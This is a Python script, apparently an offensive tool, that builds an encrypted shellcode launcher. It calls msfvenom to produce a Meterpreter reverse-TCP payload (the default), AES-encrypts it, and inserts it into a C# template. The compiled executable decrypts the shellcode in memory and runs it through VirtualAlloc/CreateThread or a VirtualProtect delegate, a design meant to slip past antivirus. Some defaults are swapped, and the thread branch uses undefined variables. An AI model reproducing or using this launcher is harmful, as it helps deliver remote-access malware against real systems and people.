#!/usr/bin/env python3
import array, base64, random, string
from Crypto.Cipher import AES
from hashlib import sha256
import argparse, subprocess, os

def main():
	args = parse_args()
	lhost = args.lhost
	lport = args.lport
	key = get_random_string(32)
	payload = args.payload
	filename = args.filename
	arch = args.arch
	base64only = args.base64only
	method = args.method
	obfuscate = args.obfuscate

	''' generate msfvenom payload '''
	print("[+] Generating MSFVENOM payload...")
	result = subprocess.run(['msfvenom',
		'-p', payload,
		'LPORT=' + lport,
		'LHOST=' + lhost,
		'-f', 'raw'],
		capture_output=True)
	buf = result.stdout

	''' encrypt the payload '''
	print("[+] Encrypting the payload, key=" + key + "...")
	hkey = hash_key(key)
	encrypted = encrypt(hkey, hkey[:16], buf)
	b64 = base64.b64encode(encrypted)

	''' if only base64 output needed'''
	if(base64only == True):
		print("[+] Base64 output:")
		print(b64.decode('utf-8'))
		print("\n[+] Have a nice day!")
		return

	''' change template '''
	print("[+] Generating launcher.cs file, method=" + method + "...")
	template = get_decryptor_template()
	template = template.replace('~BASE64~', b64.decode('utf-8'))
	template =  template.replace('~KEY~', key)

	''' obfuscating the code '''
	if(obfuscate == True):
		print("[!] Obfscating the code...")
		print("    Be patient! I'm working on it ok!!!")
		print("    Should be implemented soon!")

	''' include required code based on method '''
	if(method == "delegate"):
		template = template.replace("/* DELEGATE", "")
		template = template.replace("DELEGATE */", "")
	else:
		template = template.replace("/* THREAD", "")
		template = template.replace("THREAD */", "")

	'''save template to .cs file'''
	f = open("./launcher.cs", "w")
	f.write(template)
	f.close()

	'''compile file'''
	print("[+] Compiling the launcher...")
	if(method == "delegate"):
		os.system("mcs /platform:" + arch + " /unsafe ./launcher.cs /out:./" + filename  + ">/dev/null");
	else:
		os.system("mcs /platform:" + arch + " ./launcher.cs /out:./" + filename  + ">/dev/null");

	print("[+] Launcher compiled and written to ./" + filename)
	print("[+] Have a nice day!")

def encrypt(key,iv,plaintext):
	key_length = len(key)
	if (key_length >= 32):
		k = key[:32]
	elif (key_length >= 24):
		k = key[:24]
	else:
		k = key[:16]

	aes = AES.new(k, AES.MODE_CBC, iv)
	pad_text = pad(plaintext, 16)
	return aes.encrypt(pad_text)

def hash_key(key):
	h = ''
	for c in key:
		h += hex(ord(c)).replace("0x", "")
	h = bytes.fromhex(h)
	hashed = sha256(h).digest()
	return hashed

def pad(data, block_size):
	padding_size = (block_size - len(data)) % block_size
	if padding_size == 0:
		padding_size = block_size
	padding = (bytes([padding_size]) * padding_size)
	return data + padding

def parse_args():
	parser = argparse.ArgumentParser()

	parser.add_argument("-l", "--lport", default="0.0.0.0", type=str,
		help="The local port that msfconsole is listening on.")
	parser.add_argument("-i", "--lhost", default="4444", type=str,
			help="The local host that msfconsole is listening on.")
	parser.add_argument("-p", "--payload", default = "windows/meterpreter/reverse_tcp", type=str,
		help="The payload to generate in msfvenom.")
	parser.add_argument("-f", "--filename", default = "launcher.exe", type=str,
		help="The filename of the launcher.")
	parser.add_argument("-a", "--arch", default="x86",
		help="The target architecture (x64 or x86) for Mono.")
	parser.add_argument("-b", "--base64only", action="store_true",
		help="Output the base64 encrypted payload only.")
	parser.add_argument("-m", "--method", default="thread", type=str,
		help="The method to use: thread/delegate.")
	parser.add_argument("-o", "--obfuscate", action="store_true",
		help="Obfuscate the csharp code.")

	return parser.parse_args()

def get_random_string(length):
	letters = string.ascii_lowercase
	result_str = ''.join(random.choice(letters) for i in range(length))
	return result_str

def get_decryptor_template():
	return '''
using System;
using System.Security.Cryptography;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;

namespace Launcher
{
    static class Program
    {

/* DELEGATE
				[DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
DELEGATE */
/* THREAD
#region "Win32 InteropServices definitions"

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            UInt32 dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
        );


        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress, 
            uint dwSize, 
            uint flAllocationType, 
            uint flProtect
         );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
        );

#endregion
THREAD */
/* DELEGATE
				delegate void PrototypeFunc();
DELEGATE */

        static void Main()
        {

            // place your own encrypted base64 aes string in here - e.g. meterpreter payload. Use the encryptor.cs file to create.
            string shellcodeb64 = "~BASE64~";

            // remember to change the encryption key!
            byte[] dec_shellcode = Decrypt("~KEY~", shellcodeb64);
            RunShellcode(dec_shellcode);
        }

        public static void RunShellcode(byte[] s)
        {
/* THREAD
            IntPtr fer = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, 0x1000, 0x40);
            Marshal.Copy(shellcode, 0, (IntPtr)(fer), s.Length);
            IntPtr tj = IntPtr.Zero;
            UInt32 did = 0;
            thread = CreateThread(IntPtr.Zero, 0, fer, IntPtr.Zero, 0, ref did);
            WaitForSingleObject(tj, 0xFFFFFFFF);
THREAD */
/* DELEGATE
						unsafe
            {
                fixed(byte* ptr = s)
                {
                    IntPtr mad = (IntPtr)ptr;

                    VirtualProtect(mad, (UIntPtr)s.Length, (uint)0x40, out uint lpflOldProtect);

                    PrototypeFunc fn = (PrototypeFunc)Marshal.GetDelegateForFunctionPointer(mad, typeof(PrototypeFunc));
                    fn();
                }
            }
DELEGATE */
        }

        static byte[] Decrypt(string k, string srd)
        {
            byte[] tK = Encoding.ASCII.GetBytes(k);
            tK = SHA256.Create().ComputeHash(tK);

            byte[] f = Convert.FromBase64String(srd);

            Aes a = new AesManaged();
            a.Mode = CipherMode.CBC;
            a.Padding = PaddingMode.PKCS7;
            ICryptoTransform dc = a.CreateDecryptor(tK, sa(tK, 16));

            using (MemoryStream ms = new MemoryStream())
            {
                using (CryptoStream cs = new CryptoStream(ms, dc, CryptoStreamMode.Write))
                {

                    cs.Write(f, 0, f.Length);

                    return ms.ToArray();
                }
            }
        }

        static byte[] sa(byte[] a, int l)
        {
            byte[] b = new byte[l];
            for (int i = 0; i < l; i++)
            {
                b[i] = a[i];
            }
            return b;
        }
    }
}
'''
if __name__ == '__main__':
	main()
